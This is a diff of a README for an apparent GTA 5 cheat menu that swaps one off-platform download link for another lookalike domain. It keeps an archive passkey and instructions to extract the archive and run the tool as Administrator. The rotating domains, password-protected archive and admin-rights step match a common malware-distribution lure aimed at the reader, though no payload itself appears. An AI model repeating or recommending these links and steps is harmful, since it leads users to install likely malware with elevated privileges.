@@ -6,7 +6,7 @@ GTA 5 external menu with money drop, god mode, vehicle spawner, teleport, and mo
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -69,7 +69,7 @@ Based on popular mods like **Kiddion's Modest Menu** and **Magnus Menu**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch GTA 5.
 4. Run the hack **as Administrator**.
